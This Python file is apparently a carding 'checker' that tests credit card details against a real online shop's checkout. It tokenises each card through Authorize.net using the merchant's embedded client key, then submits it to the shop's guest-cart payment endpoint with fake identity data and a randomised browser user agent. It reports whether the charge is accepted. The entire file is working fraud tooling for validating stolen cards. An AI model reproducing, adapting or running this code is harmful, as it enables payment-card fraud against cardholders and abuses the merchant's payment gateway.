import requests
import random
import json

def check_shashionline(cc, identity):

	try:

		gate_url = "https://api2.authorize.net/xml/v1/request.api"
		gate2_url = "https://www.shashionline.com/rest/default/V1/guest-carts/MEgXirLE5pCGJrjNQLrYs8QCsWCXUGFi/payment-information"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		splitted_card = cc.split('|')

		payment_header = {
		    'Host': 'api2.authorize.net',
		    'Accept': '*/*',
		    'Origin': 'https://www.shashionline.com',
		    'X-Requested-With': 'XMLHttpRequest',
		    'Sec-Fetch-Site': 'cross-site',
		    'Sec-Fetch-Mode': 'cors',
		    'Content-type': 'application/json; charset=UTF-8',
		    'Sec-Fetch-Dest': 'empty',
		    'Referer': 'https://www.shashionline.com/',
		    'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
		    'User-agent': gate_user_agent
		}																																																																								# 012023

		payment_data = "{{securePaymentContainerRequest':{{'merchantAuthentication':{{'name':'6T2zJfSW6sJ','clientKey':'92tJ5AhnzfjS6hyvS7aLdATH5eanr5sG88Qtf8EPP8wr73X4ZaUZg6xu4u7Kcvr7'}},'data':{{'type':'TOKEN','id':'2d862aa3-2d78-a06e-90fd-1d8e57f37925','token':{{'cardNumber':'{}','expirationDate':'{}','cardCode':'{}'}} }} }}".format(splitted_card[0],
			splitted_card[1] + splitted_card[2],
			splitted_card[3])

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

		if payment_request.status_code < 300:

			try:

				transact_data = payment_request.json()['opaqueData']['dataValue']

			except Exception as E: return False

			payment_header = {
				'Accept': '*/*',
				'Origin': 'https://www.shashionline.com',
				'Sec-Fetch-Site': 'cross-site',
				'Sec-Fetch-Mode': 'cors',
				'Sec-Fetch-Dest': 'empty',
				'x-requested-with': 'XMLHttpRequest',
				'Referer': 'https://www.shashionline.com/checkout/',
				'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
				"User-agent": gate_user_agent
			}

			payment_data = '{{"cartId":"MEgXirLE5pCGJrjNQLrYs8QCsWCXUGFi","billingAddress":{{"countryId":"{}","regionId":"43","regionCode":"{}","region":"{}","street":["{}"],"company":"","telephone":"{}","postcode":"{}","city":"{}","firstname":"{}","lastname":"{}","saveInAddressBook":null}},"paymentMethod":{{"method":"authnetcim","additional_data":{{"save":false,"cc_type":"VI","cc_exp_year":"{}","cc_exp_month":"{}","cc_cid":"{}","card_id":null,"acceptjs_key":"COMMON.ACCEPT.INAPP.PAYMENT","acceptjs_value":"{}","cc_last4":"{}","cc_bin":"{}"}},"email":"{}"}}'.format(identity["results"][0]["thumbnail"]["nat"],
				"46",
				identity["results"][0]["location"]["state"],
				identity["results"][0]["location"]["street"],
				identity["results"][0]["phone"],
				identity["results"][0]["location"]["postcode"],
				identity["results"][0]["location"]["city"],
				identity["results"][0]["name"]["first"],
				identity["results"][0]["name"]["last"],
				splitted_card[2],
				splitted_card[1],
				splitted_card[3],
				transact_data,
				splitted_card[0][6:],
				splitted_card[0][:6],
				identity["results"][0]["email"])

			payment_request = requests.post(gate2_url,
				headers=payment_header,
				data=payment_data)

			if payment_request.status_code < 300:

				return True

			else: return False

		else: return False

	except Exception as E: raise E